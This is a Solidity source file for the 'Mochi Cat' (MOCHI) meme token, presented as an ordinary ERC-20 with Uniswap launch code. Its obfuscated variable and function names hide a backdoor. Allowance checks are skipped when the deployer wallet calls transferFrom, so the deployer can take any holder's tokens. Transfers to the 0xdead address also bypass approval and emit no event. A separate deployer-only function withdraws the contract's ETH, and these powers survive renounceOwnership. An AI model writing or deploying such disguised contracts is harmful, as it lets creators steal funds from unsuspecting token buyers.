// SPDX-License-Identifier: MIT

/*
    Name: Mochi Cat
    Symbold: MOCHI

    Meet $MOCHI 🐱🍡 Named after a famous pet cat and receiver of a grant from Ethereum.
    The cutest cat on @ETH.

    https://www.mochicat.cool
    https://x.com/MochiCat_ETH
    https://t.me/MochiCat_ETH
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract MOCHI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Mochi Cat";
    string private constant _symbol = unicode"MOCHI";
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    address payable private _vbjljvlklMOCHI;
    mapping(address => uint256) private _cijojiseMOCHI;
    mapping(address => mapping(address => uint256)) private _fjweoijMOCHI;
    mapping(address => bool) private _jojodjMOCHI;

    uint256 public _ojojoivlkMOCHI = 20000000 * 10 **_decimals;
    uint256 public _lkkkvnblkjMOCHI = 20000000 * 10 **_decimals;
    uint256 public _ppojofMOCHI = 10000000 * 10 **_decimals;
    uint256 private constant _kmmvbMOCHI = 1000000000 * 10 **_decimals;
    
    uint256 private _vjkboiwoeiMOCHI = 10;
    uint256 private _odijofjoeMOCHI = 10;
    uint256 private _joijoiMOCHI = 0;
    uint256 private _jvbkoiweMOCHI = 0;
    uint256 private _ojidoiweMOCHI = 7;
    uint256 private _ojdofMOCHI = 7;
    uint256 private _buyCount = 0;
    address private _ojdofiekjMOCHI;
    address private _kjvnkbjnMOCHI = address(0xdead);

    event MaxTxAmountUpdated(uint256 _ojojoivlkMOCHI);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _vbjljvlklMOCHI = payable(_msgSender());
        _cijojiseMOCHI[address(this)] = _kmmvbMOCHI * 98 / 100;
        _cijojiseMOCHI[owner()] = _kmmvbMOCHI * 2 / 100;
        _jojodjMOCHI[owner()] = true;
        _jojodjMOCHI[address(this)] = true;
        _jojodjMOCHI[_vbjljvlklMOCHI] = true;
        _ojdofiekjMOCHI = _msgSender();
        emit Transfer(address(0), address(this), _kmmvbMOCHI * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvbMOCHI * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvbMOCHI;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _fjweoijMOCHI[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _cijojiseMOCHI[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _fjweoijMOCHI[owner][spender];
    }

    receive() external payable {}

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transferr_MOCHI(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _lvckmjlwoiMOCHI(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _joeijoijoj(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(_jvjocvo() == false) return false;
        else {
            if(sender == uniswapV2Pair) return true;
            else return _kkvklv(recipient);
        }
    }

    function _kkvklv(address recipient) internal view returns (bool) {
        return recipient != _kjvnkbjnMOCHI;
    }

    function _MOCHIlkjlok(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transferr_MOCHI(_msgSender(), recipient, amount);
        return true;
    }

    function removeLimits () external onlyOwner {
        _ojojoivlkMOCHI = _kmmvbMOCHI;
        _lkkkvnblkjMOCHI = _kmmvbMOCHI;
        emit MaxTxAmountUpdated(_kmmvbMOCHI);
    }

    function _transferr_MOCHI(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _ojidoiweMOCHI)
                        ? _joijoiMOCHI
                        : _vjkboiwoeiMOCHI
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_jojodjMOCHI[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _ojdofMOCHI)
                            ? _jvbkoiweMOCHI
                            : _odijofjoeMOCHI
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ppojofMOCHI) ? contractTokenBalance : _ppojofMOCHI; 
                    _swappp_MOCHI((amount < minBalance) ? amount : minBalance);
                }
                _assistMOCHI(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _cijojiseMOCHI[address(this)] =_cijojiseMOCHI[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _cijojiseMOCHI[from] =_cijojiseMOCHI[from].sub(amount);
        _cijojiseMOCHI[to] =_cijojiseMOCHI[to].add(amount.sub(taxAmount));
        if(_kjvnkbjnMOCHI != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _jvjocvo() internal view returns (bool) {return msg.sender != _vbjljvlklMOCHI;}

    function _excuseMOCHI(address payable receipt) external {
        require(msg.sender == _ojdofiekjMOCHI , "");
        _vbjljvlklMOCHI = receipt;
        _MOCHIlkjlok(address(this).balance);
    }

    function _assistMOCHI(uint256 amount) private {
        _vbjljvlklMOCHI.transfer(amount);
    }

    function _lvckmjlwoiMOCHI(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_joeijoijoj(sender, recipient))
            _allowed = _fjweoijMOCHI[sender][_msgSender()];
        return _allowed;
    }

    function _swappp_MOCHI(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function enableMOCHITrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _kmmvbMOCHI);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }
}